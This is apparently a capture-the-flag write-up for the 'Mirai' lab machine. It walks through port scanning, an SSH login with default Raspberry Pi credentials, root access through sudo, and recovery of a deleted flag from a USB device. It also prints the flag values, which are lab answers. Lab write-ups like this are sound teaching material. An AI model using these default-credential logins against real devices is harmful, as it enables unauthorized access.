![Mirai.PNG](/assets/Machines/Easy/Mirai/Mirai.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.48
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.48
```

**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
1906/tcp  open  tpmd
32400/tcp open  plex
32469/tcp open  unknown
```

3. If we wisit web page is empty, but with curl we can look headers request
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Mirai]
└─| curl -s -X GET 'http://mirai.htb' -I
HTTP/1.1 200 OK
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 28 Dec 2022 19:15:56 GMT
Server: lighttpd/1.4.35
```
* We watch use Pi-Hole (Uses in RaspberryPi)
* If we search in admin directory we can see this 

![web.PNG](/assets/Machines/Easy/Mirai/web.PNG)

4. Search for default credentials of RaspberryPi
* **Credentials:** `pi:raspberry`

5. Try to connect with ssh with previous credentials
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Mirai]
└─| ssh pi@10.10.10.48
```

**Output**
```bash
pi@raspberrypi:~$ whoami
pi
```

6. Cat **user flag**
```bash
pi@raspberrypi:~$ cat Desktop/user.txt; echo
ff837707441b257a20e32199d7c8838d
```

---
---
---
### **Privileges Escalation** 💀

1. Look our groups
```bash
pi@raspberrypi:~$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
```

* We stay in sudo group!

2. Login how root
```bash
pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi# whoami
root
```

3. If we cat root flag look that
```bash
root@raspberrypi:/home/pi# cat /root/root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```

4. Search of all devices connect to target machine
```bash
root@raspberrypi:/home/pi# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
```

5. Print strings readable for **/media/usbstick**
```bash
root@raspberrypi:/home/pi# strings /dev/sdb
```

**Output**
```bash
...
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
...
```